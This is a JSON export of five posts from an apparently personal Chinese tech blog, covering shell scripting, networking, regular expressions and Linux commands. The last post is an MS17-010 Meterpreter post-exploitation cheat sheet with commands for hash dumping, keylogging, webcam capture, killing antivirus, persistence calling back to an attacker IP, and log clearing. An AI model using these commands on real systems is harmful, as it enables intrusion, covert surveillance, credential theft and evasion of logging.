{"posts":[{"title":"shell脚本常用命令及语法","content":"🤠当我们写入一个shell脚本时候会用到一下一些命令来支持我们脚本的运行 首先我们来看一下数据处理命令 来先认识一下不同符号的意义 $ ：这个符号是用来表示变量的，例如 A=1 在这里我们就定义A为一个变量 所以当你要进行数据处理的时候就要在 $A写成这样就可以得到A的值。 👓 #：通常这个符号在脚本中用来注释你写这一行是什么意思 👓 “”:双引号 在shell中双引号的作用表示引用这段值 例如 在这图中 echo 哪一行用到了双引号表示引用其中的值并输出 👓 **' ** 单引号：里的任何字符都会原样输出，单引号字符串中的变量是无效的 👓 **``**反引号：在shel中作为一个系统命令，并执行其内容。使用这种方法可以替换输出为一个变量 👓 ****反斜杠：zaishell中是一个隔离前后字符 👓 **[ ]**中括号：放入一些测试条件多使用与if语句中，也可以指定一个范围，例如[1-9] 👓 **{ } **花括号：主要是和$符号配合，作为字符串连接来使用 👓 ** |**管道符：用于传递上一个命令的内容到下一个命令 👓 **&gt; &gt;&gt;输出重定向：以追加的方式把命令的正确输出方式指定到文件或者设备当中 命令 &gt;&gt; 文件 👓 ** echo命令：输出 echo \\a：表示输出警告声音 echo \\n：表示换行 echo 插入\\字符 echo \\t插入tab键，相当于空格键 echo -e 不把之前的字符串做为字符串输出 echo -n 不在最后自动换行 ☂️ grep命令搜索字符串 ☂️ cut命令：字符截取 cut -f截取第几行 cut -d 按照指定分隔符分隔列 read命令：默认接受键盘的输入 read -p 打印信息 read -t 限定时间 read -s 设置变量输入的字符不显示出来 read -n 设定变量能输入的字符个数 tr命令：删除 替换 tr -d 删除字符串1中出现的所有输入字符 tr -s 删除所有重复出现字符序列，只保留第一个；即将重复出现字符串压缩为一个字符串 例子： 如图所示可以看到用 grep 搜索关键字 time 用tr 删除空格 用cut 截取到time的值 awk命令：提取输入中的一个参数 awk '{print $1,$4 ｝filenames # 行匹配语句 awk '' 只能用单引号 输出某个文件其中1，4项 awk -F 相当于内置变量FS, 指定分割字符 awk -v # 设置变量 awk -f {awk脚本} {文件名} 数学比较运算 -eq 等于 -gt 大于 -lt 小于 -ge 大于或等于 -le 小于或等于 -ne 不等于 例如判断a，b大小 #！/bin/bash a=1 b=10 if [ $a -gt $b ] then echo &quot; a&gt;b&quot; else echo &quot;a&lt;b&quot; fi test判断命令 -d检查文件是否存在且为目录 -e 检查文件是否存在 -f 检查文件是否存在且为文件 -r检查文件是否存在且可读 -s 检查文件是否存在不为空 -w 检查文件是否存在且可写 -x检查文件是否存在且可执行 -O 检查文件是否存在且被当前用户拥有 -G 检查文件是否存在且默认组为当前用户组 file1-nt file2 检查文件1是否比文件2新 file1 -ot file2 检查文件1是否比文件2旧 例如： 字符串比较运算 逻辑运算 与运算 &amp;&amp; 两个条件中 一假为假 或运算 || 一真为真 非运算 ！ 只有一个条件 非真为假 非假为真 单if 语句 if [ 条件 ] 条件为真时候执行 then 代码块 fi 结束 if .......else 语句 if [ 条件代码块 ] 如果条件为真 then 代码块 条件为真 执行代码块1 else 代码块 条件为假 执行代码块2 fi 结束 例子： if嵌套式 if [ 条件代码块 ] then if [ 条件代码块1] then 代码块2 else 代码块3 fi if语句与 shell运算 字符串之间的判断 -z 是否为空字符串 -n 是否为非空字符串 例子 ： for 循环 for循环为条件循环 for i in 语法 for var in value1 value 2 （var 变量） （value 数值） then 代码块 doen 结束 #如果使用命令赋值 则需要用到 ``号 for var in seq 1 9 then echo &quot;$var&quot; done #如果赋值是一个字符串的话 需要用 \\ 来转义字符串 for var in this\\ is\\ my\\ write's\\ shell then echo “word : $var” (())双小括号可以用来运算 done #####################################################################3 c式 for 循环 for (( i=1；i&lt;10；i++)) 提示：(i++) = ( i =i+1) do echo $i done 循环控制语句 sleep N 脚本执行到该步休眠N秒 continue 跳出循环中的某次循环 break 跳出循环继续执行后续的code ","link":"https://lhq159753.github.io/web.github.io/post/shell-jiao-ben-chang-yong-ming-ling/"},{"title":"计算机网络","content":"🐧 计算机网络是由一根通信介质将不同位置的且相互独立的计算机连接起来，并实现资源共享与数据通信 计算机网络拓扑结构 （1）总线型 由由一根同轴电缆连接，当线路出问题时候，会导致整个网络是去通信。 （2）环型 （3）树型 （4）网型 该类型的拓扑应用我们生活中很多，同时能保障网络的效率，但是网络构建的话比较复杂且成本也相对较高 根据地理位置分为三大网络 局域网（LAN）： 一个公司或者家庭 城域网（MAN）：一个地区，城市， 广域网（WAN）: 一个国家 7️⃣应用层 ：为用户提供一个应用的接口，同时也为用户直接提供各种网络服务。 ⏫ 6️⃣表示层：用于应用层的数据的编码和转换和加密。 ⏫ 5️⃣会话层：用于建立，管理和终止表示层实体之间的通信会话，类似找房子的中介 ⏫ 4️⃣传输层：建立，管理和维护为上层协议提供端到端的可靠和数据透明的传输服务(端口号)TCP UDP 在这一层作用 ⏫ 3️⃣网络层：通过IP地址来寻找目标主机来建立连接，同时选择合适的路由和交换节点（IP层）按照 给的地址传送给目的端的传输层 ⏫ 2️⃣数据链路层：把比特流组合成数据帧，在这一层使用（MAC地址）来访问介质，且进行差错检测 ⏫ 1️⃣物理层：通过物理常见的物理介质来传输比特流。 ** TCP/IP参考模型与OSI七层对应关系** 常见的网络设备 交换机: 以太网交换机了解每一端口相连设备的MAC地址，并将地址同相应的端口映射起来存放在交换机缓存中的MAC地址表中交换机就以下操作 转发/过滤：当一个数据帧的目的地址在MAC地址表中有映射时，它被转发到连接目的节点的端口而不是所有端口（如该数据帧为广播/组播帧则转发至所有端口） 消除回路：当交换机包括一个冗余回路时，以太网交换机通过生成树协议避免回路的产生，同时允许存在后备路径。 在OSI七层中交换机属于OSI第二层即数据链路层设备。它根据MAC地址寻址，通过站表选择路由，站表的建立和维护由交换机自动进行 路由器： 路由器的主要任务是把通信引导到目的地网络，然后到达特定的节点站地址。后一个功能是通过网络地址分解完成的。例如，把网络地址部分的分配指定成网络、子网和区域的一组节点，其余的用来指明子网中的特别站。分层寻址允许路由器对有很多个节站的网络存储导址信息。 传输介质： 现在传输介质有双绞线，和光纤 网络协议 计算机网络中还有很多协议，首先要了解网络协议的三个要素 网络协议三要素： ⛔️语义。语义是解释控制信息每个部分的意义。它规定了需要发出何种控制信息，以及完成的动作与做出什么样的响应。 ⛔️ 语法。语法是用户数据与控制信息的结构与格式，以及数据出现的顺序。 ⛔️ 时序。时序是对事件发生顺序的详细说明。（也可称为“同步”）。 更深入了解可以去大佬了解一波 https://blog.csdn.net/qq_23864697/article/details/89015659 ","link":"https://lhq159753.github.io/web.github.io/post/ji-suan-ji-wang-luo/"},{"title":"正则表达式","content":"📙📙📙 🕛 正则表达式用来在文件中匹配符合条件的字符串，正则是包含匹配。 在liunx中一些命令可以支持正则表达式 通配符用来匹配符合条件的文件名，通配符是完全匹配。 ls、find、cp这些命令不支持正则表达式，所以只能自己用shell自己的通配符来进行匹配 📃 元字符 ** 作用** * | 前一个字符匹配0次或任意多次 🕐 {n} |表示其前面的字符恰好出现几次。 例子：[0-9]\\｛4\\｝匹配4个数字 [1][3-8][0-9]{9}匹配手机电话号码 {n,} |表示其前面的字符出现不小于n次 例：[0-9]{2,} 表示两位及以上的数字 {n,m} | 表示其前面的字符至少出现了n次，最多出现m次 例： [a-z]{6,8} 匹配6到8位的小写字母 🕓 \\cx 匹配由x指明的控制字符。例如， \\cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 'c' 字符。 \\f 匹配一个换页符。等价于 \\x0c 和 \\cL。 \\n 匹配一个换行符。等价于 \\x0a 和 \\cJ。 \\r 匹配一个回车符。等价于 \\x0d 和 \\cM。 🕔 \\s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \\f\\n\\r\\t\\v]。注意 Unicode 正则表达式会匹配全角空格符。 \\S 匹配任何非空白字符。等价于 [^ \\f\\n\\r\\t\\v]。 \\t 匹配一个制表符。等价于 \\x09 和 \\cI 。 \\v 匹配一个垂直制表符。等价于 \\x0b 和 \\cK。 🕕 匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。 ? 匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。 \\b 匹配一个单词边界，即字与空格间的位置。 🕖 \\B 非单词边界匹配。 \\cx 匹配由 x 指明的控制字符。例如， \\cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 'c' 字符。 \\d 匹配一个数字字符。等价于 [0-9]。 🕘 \\D 匹配一个非数字字符。等价于 [^0-9]。 \\f 匹配一个换页符。等价于 \\x0c 和 \\cL。 \\n 匹配一个换行符。等价于 \\x0a 和 \\cJ。 🕙 \\r 匹配一个回车符。等价于 \\x0d 和 \\cM。 \\s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \\f\\n\\r\\t\\v]。 \\S 匹配任何非空白字符。等价于 [^ \\f\\n\\r\\t\\v]。 \\t 匹配一个制表符。等价于 \\x09 和 \\cI。 \\v 匹配一个垂直制表符。等价于 \\x0b 和 \\cK。 🕜 \\w 匹配字母、数字、下划线。等价于'[A-Za-z0-9_]'。 \\W 匹配非字母、数字、下划线。等价于 '[^A-Za-z0-9_]'。 \\xn 匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，'\\x41' 匹配 &quot;A&quot;。'\\x041' 则等价于 '\\x04' &amp; &quot;1&quot;。正则表达式中可以使用 ASCII 编码。 \\num 匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，'(.)\\1' 匹配两个连续的相同字符。 \\n 标识一个八进制转义值或一个向后引用。如果 \\n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。 🕞 \\nm 标识一个八进制转义值或一个向后引用。如果 \\nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \\nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \\nm 将匹配八进制转义值 nm。 \\nml 如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。 🕚 正则表达式的优先级别 优先级别由上到下 1️⃣ \\ 转义符 2️⃣ (), (?😃, (?=), [] 圆括号和方括号 3️⃣ *, +, ?, {n}, {n,}, {n,m} 限定符 4️⃣ ^, $, \\任何元字符、任何字符 定位点和序列（即：位置和顺序） 5️⃣ | 替换，&quot;或&quot;操作 字符具有高于替换运算符的优先级，使得&quot;m|food&quot;匹配&quot;m&quot;或&quot;food&quot;。若要匹配&quot;mood&quot;或&quot;food&quot;，请使用括号创建子表达式，从而产生&quot;(m|f)ood&quot;。 ","link":"https://lhq159753.github.io/web.github.io/post/zheng-ze-biao-da-shi/"},{"title":"🐃Liunx相关命令","content":"🤡 ls #查看当前目录下的文件 ls -l查看相关文件权限 lspci -vvv #查看网卡驱动 lspci #查看网卡信息 touch #创建一个文件 mkdir #创建一个目录 mkdir -p 递归创建目录 ⌚️ cd 进入一个目录 rm 删除文件 ▶️ cat #适合查看较少的文件， cat -n显示行号 more 适合查看文件较多，可以分页浏览 less #查看文件 可以搜索目标文件 less +参数 +文件 （ -b 设置缓冲区大小， -e 当文件显示结束自动离开， -f 强制打开特殊文件，例 目录 二进制文件， -i 忽略搜索时的大小写 ， -N显示每行的行号 ） head -n 查看目标为文件所需的几行 mv 移动文件 cp 复制文件 cp -p 递归的复制文件 in 生成连接文件 in -s 生成为软链接 类似于Windows的快捷方式 ▶️ useradd +name 创建用户 userdel 删除用户信息 groupadd 创建组 groupdel 删除组 权限更改 chmod （u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限。r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行。） ☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️☁️ 👓 chown 改变文件所属用户 # chown +user +file chgrp 改变文件或目录所属组 umask -S 查看权限更改默认权限 ▶️ 文件搜索命令 find *号代表某个字符 ？问代表单个字符 find /目标文件 find /-size +文件大小 （在根目录下查找大于多少的文件） +n 大于 -n 小于 n 等于 find /etc -cmin -5 （在etc 目录下查找五分钟被修改过的属性文件或者目录） -amin 访问时间 -cmin文件属性 -mmin 文件内容 -a 两个条件同时满足 -o 两个条件满足任意一个即可 find /etc -size +163840 -a -size 204800 表示（查找大于80M小于100M 的文件） -type 根据文件类型查找 find /etc -name inittab -exec ls -l ｛｝\\ （查找文件并显示详细信息） -exec / -ok命令 ｛｝\\： 根据用户所属组来查找文件 -user -group locate ：查找文件在资料库中的位置 updatedb 更新文件 +i不区分大小写查找文件 which 搜索命令所在的目录 whereis 搜索命令坐在的目录及帮助文档路径 grep 在文件中搜索字串匹配的行 grep -i 忽略大小写查找文件 grep -v排除制定字串 获得帮助命令 man 获得帮助信息 whatis 直接查看配置命令的信息 apropos 查看配置文件的简短信息 用户管理命令 useradd +用户名 ：创建一个用户 passwd +用户名 ：创建新用户的密码 tty ：本地终端 pts：远程终端 who 查看用户登陆 w： 查看用户详细信息 ▶️ 压缩解压命令 gzip ：压缩文件只能压缩文件 gunzip：解压缩 gzip -d gunzip + 文件名.gz tar：压缩目录 tat -c：打包 tar -v 显示信息 tar -f：指定文件名 tar -z打包同时压缩 压缩后文件格式 ：tar.gz tar -x 解包 tar -z解压缩 压缩后文件格式： gz zip：压缩文件或目录 zip 选项（-r）（压缩后文件名） （文件或目录） unzip：解压缩 ▶️ 👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋👋 ：s/aa/bb/g 表示将光标所在行出现的包含aa的字符全部替换为bb ：%s/aa/bb/g 将文档出现所有包含aa的字符中的aa替换为bb ：12，23s/aa/bb/g 将文档从12行中所出现的所有包含aa的字符替换为bb ：12，23s/^/#/ 将从12行到23行的行首加入#字符 ：g/^\\s*$/d 将所有不好喊字符（空格也不包含）的空行删除 ：%s!\\s*//.*!! 去掉所有的“//”注释 👓 yum 在线管理 yum list 查询克用软件包列表 安装：yum -y install +包名 卸载: yum -y remove +包名 yum grouplist 列出所有可用的软件组列表 yum groupinstall 列出组名：安装指定转件组 yum groupremove 软件组名：卸载指定软件组 👓 权限管理 setfacl 选项+文件名 -m 设定acl权限 -x 删除指定的acl权限 -b 删除所有权限 -d 指定默认acl权限 -k 删除默认acl权限 -R 递归设定acl权限 👓 设定setuid的方法 4代表 SUID chmod 4755 +文件名 chmod u+s+文件名 取消setUID chmod +755 文件名 ","link":"https://lhq159753.github.io/web.github.io/post/liunx-xiang-guan-ming-ling/"},{"title":"如何利用  ms17-010开始进行渗透测试","content":"🕎 然后在kali终端 打开rdesktop + 目标ip地址 ：3389 🌲后期渗透 sysinfo #查看目标主机系统信息 run scraper #查看目标主机详细信息 run hashdump #导出密码的哈希 load kiwi #加载 ps #查看目标主机进程信息 pwd #查看目标当前目录(windows) getlwd #查看目标当前目录(Linux) search -f *.jsp -d e:\\ #搜索E盘中所有以.jsp为后缀的文件 download e:\\test.txt /root #将目标机的e:\\test.txt文件下载到/root目录下 upload /root/test.txt d:\\test #将/root/test.txt上传到目标机的 d:\\test\\ 目录下getpid #查看当前Meterpreter Shell的进程 PIDmigrate 1384 #将当前Meterpreter Shell的进程迁移到PID为1384的进程上 idletime #查看主机运行时间 getuid #查看获取的当前权限 getsystem #提权 run killav #关闭杀毒软件 screenshot #截图 webcam_list #查看目标主机的摄像头 webcam_snap #拍照 webcam_stream #开视频 execute 参数 -f 可执行文件 #执行可执行程序 run getgui -u hack -p 123 #创建hack用户，密码为123 run getgui -e #开启远程桌面 keyscan_start #开启键盘记录功能 keyscan_dump #显示捕捉到的键盘记录信息 keyscan_stop #停止键盘记录功能 uictl disable keyboard #禁止目标使用键盘 uictl enable keyboard #允许目标使用键盘 uictl disable mouse #禁止目标使用鼠标 uictl enable mouse #允许目标使用鼠标 load #使用扩展库 run #使用扩展库 run persistence -X -i 5 -p 8888 -r 192.168.10.27 #反弹时间间隔是5s 会自动连接 192.168.27的4444端口，缺点是容易被杀毒软件查杀 portfwd add -l 3389 -r 192.168.11.13 -p 3389 #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址 clearev #清除日志 run post/windows/manage/migrate #自动进程迁移 run post/windows/gather/checkvm #查看目标主机是否运行在虚拟机上 run post/windows/manage/killav #关闭杀毒软件 run post/windows/manage/enable_rdp #开启远程桌面服务 run post/windows/manage/autoroute #查看路由信息 run post/windows/gather/enum_logged_on_users #列举当前登录的用户 run post/windows/gather/enum_applications #列举应用程序 run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码 run windows/gather/smart_hashdump #dump出所有用户的hash ","link":"https://lhq159753.github.io/web.github.io/post/ru-he-li-yong-ms17-010-kai-shi-jin-xing-sheng-shen-tou-ce-shi/"}]}